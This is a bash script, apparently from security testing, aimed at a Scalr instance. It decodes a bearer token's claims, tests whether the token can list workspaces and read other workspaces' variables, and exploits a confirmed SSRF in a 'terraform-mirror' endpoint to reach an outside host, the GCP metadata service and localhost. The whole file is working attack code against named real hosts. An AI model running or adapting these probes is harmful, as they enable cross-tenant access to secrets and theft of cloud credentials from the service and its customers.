#!/usr/bin/env bash

echo "=== SCALR_TOKEN claims ==="
echo "$SCALR_TOKEN" | cut -d. -f2 | python3 -c "
import sys, base64, json
raw = sys.stdin.read().strip()
pad = raw + '=' * (4 - len(raw) % 4)
try:
    decoded = base64.urlsafe_b64decode(pad)
    claims = json.loads(decoded)
    print(json.dumps(claims, indent=2))
except Exception as e:
    print('err:', e)
"

echo ""
echo "=== SCALR_TOKEN: can it read OTHER workspaces in env? ==="
RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces?page%5Bsize%5D=10" \
  -H "Authorization: Bearer $SCALR_TOKEN")
STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
echo "HTTP $STATUS"
echo "$BODY" | python3 -c "
import sys,json
d=json.load(sys.stdin)
wss=d.get('data',[])
print('visible workspaces:', len(wss))
for w in wss: print(' -', w['id'], w['attributes'].get('name','?'))
" 2>&1 || echo "raw response: $(echo $BODY | head -c 300)"

echo ""
echo "=== SCALR_TOKEN: read ANOTHER workspace's vars (ws-v0p4n0bbq2e78ldn5) ==="
RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces/ws-v0p4n0bbq2e78ldn5/vars" \
  -H "Authorization: Bearer $SCALR_TOKEN")
STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
echo "HTTP $STATUS"
echo "$BODY" | python3 -c "
import sys,json
d=json.load(sys.stdin)
vs=d.get('data',[])
print('vars count:', len(vs))
for v in vs:
    a=v['attributes']
    val = '[hidden]' if a.get('sensitive') else str(a.get('value',''))[:40]
    print(' -', a.get('key'), 'sensitive='+str(a.get('sensitive')), 'value='+val)
" 2>&1 || echo "raw response: $(echo $BODY | head -c 300)"

echo ""
echo "=== SCALR_TOKEN: read staging-bug-verify workspace vars (ws-v0p8cianp71fdotjv) ==="
RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces/ws-v0p8cianp71fdotjv/vars" \
  -H "Authorization: Bearer $SCALR_TOKEN")
STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
echo "HTTP $STATUS"
echo "$BODY" | python3 -c "
import sys,json
d=json.load(sys.stdin)
vs=d.get('data',[])
print('vars count:', len(vs))
for v in vs:
    a=v['attributes']
    val = '[hidden]' if a.get('sensitive') else str(a.get('value',''))[:40]
    print(' -', a.get('key'), 'sensitive='+str(a.get('sensitive')), 'value='+val)
" 2>&1 || echo "raw response: $(echo $BODY | head -c 300)"

echo ""
echo "=== C4 SSRF: URL-encoded scheme (CONFIRMED VECTOR) ==="
curl -sk --max-time 8 --no-location --path-as-is -D - \
  "https://internal.main.scalr.dev/terraform-mirror/https%3A%2F%2Fhttpbin.org%2Fstatus%2F200" \
  2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -3

echo ""
echo "=== C4 SSRF: probe GCP metadata via API server ==="
curl -sk --max-time 8 --no-location --path-as-is -D - \
  "https://internal.main.scalr.dev/terraform-mirror/http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F" \
  2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -3

echo ""
echo "=== C4 SSRF: probe internal API endpoint via mirror ==="
curl -sk --max-time 8 --no-location --path-as-is -D - \
  "https://internal.main.scalr.dev/terraform-mirror/http%3A%2F%2F127.0.0.1%2Fhealthz" \
  2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -3

echo "=== done ==="
